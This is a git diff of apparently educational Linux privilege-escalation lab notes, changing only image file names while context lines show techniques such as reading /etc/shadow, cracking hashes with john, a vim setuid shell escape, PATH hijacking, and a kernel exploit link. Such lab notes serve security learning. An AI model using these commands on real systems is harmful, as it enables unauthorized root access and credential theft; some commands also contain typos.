@@ -42,13 +42,13 @@ uname -r
 python -V
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 cat /etc/issuse
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### initial Access
 
@@ -72,7 +72,7 @@ searchsploit "Linux Kernel version" or search in Google site:exploit-db.com "Lin
 
 {% embed url="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2015/CVE-2015-1328" %}
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 gcc exploit.c -o exploit
@@ -105,7 +105,7 @@ To get a password Frank uses **`sudo less /etc/shadow`**
 
 <figure><img src="../../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -113,7 +113,7 @@ Privilege Escalation: SUID
 
 
 
-<figure><img src="../../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We run the command
 
@@ -137,7 +137,7 @@ i searched i google to find the privisc using base64
 base64 "$LFILE" | base64 --decode
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 unshasow
 
@@ -146,7 +146,7 @@ unshadow pass.txt shadow.txt > passshadow.txt
 john passshadow.txt
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>
 
@@ -178,7 +178,7 @@ vim -c `:py3 import os; os.setuid(0); os.excel("/bin/sh", "sh", "-c", "reset; ex
 
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 crontab
 
@@ -215,7 +215,7 @@ unshadow pass.txt shadow.txt > passshadow.txt
 john passshadow.txt
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Privilege Escalation: PATH
 
@@ -231,7 +231,7 @@ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 export PATH=/tmp:$PATH
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Privilege Escalation: NFS
 
@@ -269,7 +269,7 @@ showmount -e <you-ip>
    ./payload
    ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Capstone Project
 
